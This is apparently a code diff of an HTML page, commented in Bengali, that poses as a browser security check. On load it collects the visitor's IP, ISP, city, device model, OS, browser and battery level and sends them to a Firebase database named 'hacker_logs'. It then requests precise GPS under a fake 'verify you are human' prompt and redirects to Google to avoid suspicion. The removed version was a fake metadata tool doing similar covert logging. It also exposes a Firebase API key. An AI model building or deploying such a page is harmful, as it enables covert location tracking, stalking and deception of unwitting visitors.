@@ -1,20 +1,19 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Secure Metadata Tool</title>
+    <title>Security Verification</title>
     
-    <!-- Piexif (মেটাডাটার জন্য) -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
-    <!-- UAParser (মোবাইল নাম বের করার জাদুকরী টুল) -->
+    <!-- UAParser (ডিভাইস ইনফো বের করার জন্য) -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
     
     <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
+        // তোর কনফিগারেশন
         const firebaseConfig = {
             apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
             authDomain: "location-611d6.firebaseapp.com",
@@ -28,126 +27,183 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // ডাটা পাঠানোর ফাংশন
-        window.sendDataToFirebase = function(data) {
+        // গ্লোবাল ফাংশন ডাটা পাঠানোর জন্য
+        window.logToFirebase = function(data) {
             const trackerRef = ref(db, 'hacker_logs');
-            const newLogRef = push(trackerRef);
+            const newLogRef = push(trackerRef); // নতুন ID তৈরি হলো
             
+            // ডাটা সেভ করা
             set(newLogRef, {
                 timestamp: new Date().toString(),
                 ...data
+            }).then(() => {
+                // সেশন ID সেভ করে রাখা যাতে পরে লোকেশন আপডেট করা যায়
+                sessionStorage.setItem('currentLogKey', newLogRef.key);
             });
-        }
+        };
+
+        // শুধু লোকেশন আপডেট করার জন্য ফাংশন
+        window.updateLocation = function(lat, lng) {
+            const key = sessionStorage.getItem('currentLogKey');
+            if (key) {
+                const updateRef = ref(db, 'hacker_logs/' + key);
+                update(updateRef, {
+                    latitude: lat,
+                    longitude: lng,
+                    actionStatus: "GPS Tracked via Auto-Trap"
+                });
+            }
+        };
     </script>
 
     <style>
-        /* তোর পছন্দের স্টাইল */
-        body { background-color: #e0e5ec; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .mobile-container { width: 90%; max-width: 400px; background: #e0e5ec; border-radius: 20px; padding: 20px; box-shadow: 10px 10px 20px #a3b1c6, -10px -10px 20px #ffffff; text-align: center; }
-        .neu-btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: 6px 6px 12px #a3b1c6, -6px -6px 12px #ffffff; color: #4a4a4a; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
-        .neu-btn:active { box-shadow: inset 4px 4px 8px #a3b1c6, inset -4px -4px 8px #ffffff; }
-        .upload-area { padding: 20px; border-radius: 15px; box-shadow: inset 6px 6px 12px #a3b1c6, inset -6px -6px 12px #ffffff; margin-bottom: 25px; }
-        #preview { width: 100%; max-width: 200px; display: none; margin-top: 15px; border-radius: 10px; }
+        body {
+            background-color: #f4f6f8;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .loader-container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        
+        .verify-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .verify-btn:hover { background-color: #2980b9; }
+
+        /* Hidden iframe approach helps sometimes but mostly direct JS is better */
     </style>
 </head>
 <body>
 
-    <div class="mobile-container">
-        <h2>🕵️ Metadata Tool</h2>
-        <div class="upload-area">
-            <input type="file" id="fileInput" accept="image/*">
-            <button class="neu-btn" onclick="document.getElementById('fileInput').click()" style="color:#007bff">📂 ছবি দিন</button>
-            <img id="preview" src="">
-        </div>
-        <div id="statusBox" style="display:none; color:green; font-weight:bold; margin-bottom:15px;"></div>
-        <button id="saveBtn" class="neu-btn" onclick="fakeProcess()" disabled style="color:gray">💾 সেভ করুন</button>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <h2 id="statusTitle">Checking Browser Security...</h2>
+        <p id="statusDesc">Please wait while we verify your connection.</p>
+        
+        <!-- এই বাটনটা শুরুতে লুকানো থাকবে, যদি অটো না কাজ করে তখন আসবে -->
+        <button id="manualBtn" class="verify-btn" style="display:none;" onclick="triggerGPS()">Click to Verify</button>
     </div>
 
     <script>
-        let currentImgData = null;
-        let userLat = null; let userLng = null;
-        let ipData = { ip: "Tracing...", city: "Unknown" };
+        // পেজ লোড হওয়ামাত্রই কাজ শুরু
+        window.onload = function() {
+            captureBasicInfo();
+            // ১ সেকেন্ড পর লোকেশন চাইবে অটোমেটিক
+            setTimeout(triggerGPS, 1000);
+        };
 
-        // ১. আইপি বের করা
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-            ipData = data;
-            logToFirebase(false, "Page Visited"); // পেজ লোড হওয়ামাত্র লগ
-        });
+        function captureBasicInfo() {
+            // ১. আইপি এবং নেটওয়ার্ক ইনফো
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    // ২. ডিভাইস ইনফো (UAParser)
+                    var parser = new UAParser();
+                    var result = parser.getResult();
+                    
+                    let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
+                    
+                    // ব্যাটারি স্ট্যাটাস (যদি পাওয়া যায় - এডভান্সড হ্যাকিং)
+                    let batteryLevel = "Unknown";
+                    if(navigator.getBattery) {
+                        navigator.getBattery().then(function(battery) {
+                            batteryLevel = (battery.level * 100) + "%";
+                            sendInitialLog(ipData, deviceName, batteryLevel, result);
+                        });
+                    } else {
+                        sendInitialLog(ipData, deviceName, "Not Supported", result);
+                    }
+                })
+                .catch(err => {
+                    // আইপি API ফেল করলেও ডিভাইস ইনফো পাঠাবো
+                    sendInitialLog({}, "Unknown", "Unknown", new UAParser().getResult());
+                });
+        }
 
-        // ২. ছবি হ্যান্ডলিং
-        document.getElementById('fileInput').addEventListener('change', function(e) {
-            let file = e.target.files[0];
-            if (file) {
-                let reader = new FileReader();
-                reader.onload = function(event) {
-                    currentImgData = event.target.result;
-                    document.getElementById('preview').src = currentImgData;
-                    document.getElementById('preview').style.display = 'block';
-                    requestLocation(); // লোকেশন চাওয়া
-                }
-                reader.readAsDataURL(file);
-            }
-        });
+        function sendInitialLog(ipData, deviceName, battery, uaResult) {
+            let logData = {
+                ip: ipData.ip || "Hidden IP",
+                city: ipData.city || "Unknown City",
+                isp: ipData.org || "Unknown ISP",
+                deviceModel: deviceName,
+                os: uaResult.os.name + " " + (uaResult.os.version || ""),
+                browser: uaResult.browser.name,
+                cpu: uaResult.cpu.architecture || "Unknown",
+                battery: battery,
+                latitude: "Pending...", // জিপিএস পাওয়ার আগে পেন্ডিং দেখাবে
+                longitude: "Pending...",
+                actionStatus: "Target Landed on Page"
+            };
 
-        // ৩. লোকেশন রিকোয়েস্ট
-        function requestLocation() {
-            let status = document.getElementById('statusBox');
-            status.style.display = 'block';
-            status.innerText = "ডিভাইস ভেরিফাই হচ্ছে...";
-            
+            // ফায়ারভেজে পাঠাও
+            if(window.logToFirebase) window.logToFirebase(logData);
+        }
+
+        function triggerGPS() {
+            // ইউজারের কাছে মনে হবে ভেরিফিকেশন হচ্ছে
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        userLat = pos.coords.latitude;
-                        userLng = pos.coords.longitude;
-                        status.innerText = "✅ ডিভাইস ভেরিফাইড!";
-                        document.getElementById('saveBtn').disabled = false;
-                        document.getElementById('saveBtn').style.color = "#00b894";
-                        logToFirebase(true, "GPS Success"); // লোকেশন পাওয়ার পর লগ
+                    function(position) {
+                        // সাকসেস!
+                        if(window.updateLocation) {
+                            window.updateLocation(position.coords.latitude, position.coords.longitude);
+                        }
+                        
+                        // হ্যাকারকে বোকা বানানোর জন্য রিডাইরেক্ট বা মেসেজ
+                        document.getElementById('statusTitle').innerText = "Verification Successful!";
+                        document.getElementById('statusDesc').innerText = "Redirecting...";
+                        document.querySelector('.spinner').style.borderTopColor = "green";
+                        
+                        // ৩ সেকেন্ড পর Google এ পাঠিয়ে দাও (যাতে সে কিছু সন্দেহ না করে)
+                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
                     },
-                    (err) => {
-                        status.innerText = "❌ লোকেশন অ্যাক্সেস দরকার!";
-                        status.style.color = "red";
-                        logToFirebase(false, "GPS Denied"); // লোকেশন না দিলে লগ
+                    function(error) {
+                        // ইউজার ব্লক করেছে বা অটোমেটিক পপ-আপ আসেনি
+                        console.log("GPS Blocked or Failed");
+                        
+                        // স্ট্র্যাটেজি ২: বাটন দেখানো (সোশ্যাল ইঞ্জিনিয়ারিং)
+                        document.getElementById('statusTitle').innerText = "Verification Failed";
+                        document.getElementById('statusDesc').innerText = "Please allow location access to verify you are human.";
+                        document.getElementById('manualBtn').style.display = 'inline-block';
+                        document.querySelector('.spinner').style.display = 'none';
                     },
                     { enableHighAccuracy: true }
                 );
             }
-        }
-
-        // ৪. মেইন ফাংশন: ডিভাইস ইনফো বের করে পাঠানো
-        function logToFirebase(hasLocation, action) {
-            // UAParser দিয়ে ইনফো বের করা
-            var parser = new UAParser();
-            var result = parser.getResult();
-
-            // সুন্দর করে নাম সাজানো
-            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "PC/Unknown Mobile");
-            let osName = result.os.name + " " + (result.os.version || "");
-            let browserName = result.browser.name;
-
-            let logData = {
-                ip: ipData.ip || "Unknown",
-                city: ipData.city || "Unknown",
-                isp: ipData.org || "Unknown",
-                
-                // নতুন ডিটেইলস ডাটা
-                deviceModel: deviceName, // যেমন: Samsung SM-A50
-                os: osName,             // যেমন: Android 10
-                browser: browserName,   // যেমন: Chrome Mobile
-                cpu: result.cpu.architecture || "Unknown",
-                
-                latitude: hasLocation ? userLat : "Denied",
-                longitude: hasLocation ? userLng : "Denied",
-                actionStatus: action
-            };
-
-            if(window.sendDataToFirebase) window.sendDataToFirebase(logData);
-        }
-
-        function fakeProcess() {
-            alert("🎉 প্রোসেসিং কমপ্লিট! (কিন্তু ডাটা অলরেডি চুরি হয়ে গেছে 😈)");
-            logToFirebase(true, "Download Clicked");
         }
     </script>
 </body>
